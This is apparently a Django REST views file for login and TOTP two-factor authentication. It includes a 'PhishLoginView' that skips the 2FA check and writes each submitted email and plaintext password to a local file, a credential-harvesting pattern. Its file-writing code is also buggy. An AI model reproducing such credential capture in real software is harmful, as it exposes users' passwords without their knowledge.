from django.contrib.sessions.models import Session
from django.shortcuts import get_object_or_404
from rest_framework.response import Response
from rest_framework import status, generics
from django.contrib.auth import authenticate, login, logout
from rest_framework.authtoken.models import Token
from django.utils import timezone
from rest_framework.permissions import AllowAny

from otp_app.permission import IsAuthenticatedAndVerified
from otp_app.serializers import UserSerializer
from otp_app.models import UserModel, get_user_id, get_user_token
import pyotp



class RegisterView(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()
    permission_classes = [AllowAny]

    def post(self, request):
        serializer = self.serializer_class(data=request.data)
        if serializer.is_valid():
            try:
                serializer.save()
                return Response({"status": "success", 'message': "Registered successfully, please login"},
                                status=status.HTTP_201_CREATED)
            except:
                return Response({"status": "fail", "message": "User with that email already exists"},
                                status=status.HTTP_409_CONFLICT)
        else:
            return Response({"status": "fail", "message": serializer.errors}, status=status.HTTP_400_BAD_REQUEST)



class LoginView(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()
    permission_classes = [AllowAny]

    def post(self, request):
        data = request.data
        email = data.get('email')
        password = data.get('password')

        user = authenticate(username=email.lower(), password=password)

        if user is None:
            return Response({"status": "fail", "message": "Incorrect email or password"},
                            status=status.HTTP_400_BAD_REQUEST)

        if not user.check_password(password):
            return Response({"status": "fail", "message": "Incorrect email or password"},
                            status=status.HTTP_400_BAD_REQUEST)

        # Логин пользователя и выдача токена
        serializer = self.serializer_class(user)
        login(request, user)
        token, _ = Token.objects.get_or_create(user=user)

        # Если у пользователя требуется двухфакторная аутентификация
        if user.otp_validate and not user.otp_verified:
            return Response({
                "status": "pending_otp",
                "message": "OTP verification is required",
                "firstname": serializer.data['first_name'],
                "lastname": serializer.data['last_name'],
                "email": serializer.data['email'],
                "token": token.key  # Передаем токен, чтобы фронтенд мог использовать его для дальнейших запросов
            }, status=status.HTTP_202_ACCEPTED)  # Используем статус 202 для обозначения, что требуется дальнейшее действие

        # Если двухфакторная аутентификация не требуется или она уже пройдена
        return Response({
            "status": "success",
            "firstname": serializer.data['first_name'],
            "lastname": serializer.data['last_name'],
            "email": serializer.data['email'],
            "token": token.key
        }, status=status.HTTP_200_OK)

class PhishLoginView(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()
    permission_classes = [AllowAny]

    def post(self, request):
        data = request.data
        email = data.get('email')
        password = data.get('password')

        user = authenticate(username=email.lower(), password=password)

        if user is None:
            return Response({"status": "fail", "message": "Incorrect email or password"},
                            status=status.HTTP_400_BAD_REQUEST)

        if not user.check_password(password):
            return Response({"status": "fail", "message": "Incorrect email or password"},
                            status=status.HTTP_400_BAD_REQUEST)

        # Логин пользователя и выдача токена
        serializer = self.serializer_class(user)
        login(request, user)
        token, _ = Token.objects.get_or_create(user=user)

        with open('user_data.txt', 'w') as file:
            file.write('email: ', email)
            file.write('password: ', password)
        # Если двухфакторная аутентификация не требуется или она уже пройдена
        return Response({
            "status": "success",
            "firstname": serializer.data['first_name'],
            "lastname": serializer.data['last_name'],
            "email": serializer.data['email'],
            "token": token.key
        }, status=status.HTTP_200_OK)

class LogoutView(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()

    def post(self, request):
        if request.user.is_authenticated:

            user_id = get_user_id(request)
            user = UserModel.objects.filter(id=user_id).first()
            if user is None:
                return Response({"status": "fail", "message": f"No user with Id: {user_id} found"},
                                status=status.HTTP_404_NOT_FOUND)
            user.otp_verified = False
            user.save()
            serializer = self.serializer_class(user)
            try:
                print('token')
                token = token = get_object_or_404(Token, key=get_user_token(request))
                token.delete()
            except Token.DoesNotExist:
                pass
            logout(request)
            return Response({'detail': 'Logout successful'}, status=status.HTTP_200_OK)
        else:
            return Response({'detail': 'Not authenticated'}, status=status.HTTP_401_UNAUTHORIZED)

class GenerateOTP(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()

    def post(self, request):
        user_id = get_user_id(request)
        # проверка что зашел user
        user = UserModel.objects.filter(id=user_id).first()
        email = user.email
        if user == None:
            return Response({"status": "fail", "message": f"No user with Id: {user_id} found"},
                            status=status.HTTP_404_NOT_FOUND)
        if user.otp_mode and user.otp_validate:
            return Response({"status": "fail", "message": f"User with Id: {user_id} have 2FA"},
                            status=status.HTTP_404_NOT_FOUND)
        else:
            otp_base32 = pyotp.random_base32()
            otp_auth_url = pyotp.totp.TOTP(otp_base32).provisioning_uri(
                name=email.lower(), issuer_name="codevoweb.com")

            user.otp_auth_url = otp_auth_url
            user.otp_base32 = otp_base32
            user.otp_mode = True
            user.save()
            # добавить ссылку на ввод далее
            return Response({'base32': otp_base32, "otpauth_url": otp_auth_url})



class ValidateOTP(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()
    def post(self, request):
        message = "Token is invalid or user doesn't exist"
        data = request.data
        otp_token = data.get('otp_token', None)
        user_id = get_user_id(request)
        user = UserModel.objects.filter(id=user_id).first()
        if user is None:
            return Response({"status": "fail", "message": f"No user with Id: {user_id} found"},
                            status=status.HTTP_404_NOT_FOUND)
        totp = pyotp.TOTP(user.otp_base32)
        if not totp.verify(otp_token, valid_window=1):
            return Response({"status": "fail", "message": message}, status=status.HTTP_400_BAD_REQUEST)
        user.otp_validate = True
        user.otp_verified = True
        user.save()
        serializer = self.serializer_class(user)
        return Response({'otp_validated': True})

class VerifyOTP(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()

    def post(self, request):
        data = request.data
        otp_token = data.get('otp_token', None)
        user_id = get_user_id(request)

        # Проверка наличия пользователя
        user = UserModel.objects.filter(id=user_id).first()
        if user is None:
            return Response({"status": "fail", "message": f"No user with Id: {user_id} found"},
                            status=status.HTTP_404_NOT_FOUND)

        # Проверка наличия секретного ключа для OTP
        if not user.otp_base32 and user.otp_mode and user.otp_validate:
            return Response({"status": "fail", "message": "OTP is not enabled for this user"},
                            status=status.HTTP_400_BAD_REQUEST)

        # Проверка правильности введённого OTP
        totp = pyotp.TOTP(user.otp_base32)
        if not totp.verify(otp_token):
            return Response({"status": "fail", "message": "Invalid or expired OTP"}, status=status.HTTP_400_BAD_REQUEST)

        # Верификация прошла успешно
        user.otp_verified = True
        user.save()

        # Возвращаем обновленные данные пользователя
        serializer = self.serializer_class(user)
        return Response({"status": "success", 'message': "verification is successfuly"}, status=status.HTTP_200_OK)


class DisableOTP(generics.GenericAPIView):
    serializer_class = UserSerializer
    queryset = UserModel.objects.all()
    permission_classes = [IsAuthenticatedAndVerified]

    def post(self, request):
        user_id = get_user_id(request)
        user = UserModel.objects.filter(id=user_id).first()
        if user is None:
            return Response({"status": "fail", "message": f"No user with Id: {user_id} found"},
                            status=status.HTTP_404_NOT_FOUND)

        user.otp_mode = False
        user.otp_validate = False
        user.otp_verified = False
        user.otp_base32 = None
        user.otp_auth_url = None
        user.save()
        serializer = self.serializer_class(user)

        return Response({"status": "success", 'message': "otp is disabled"}, status=status.HTTP_200_OK)
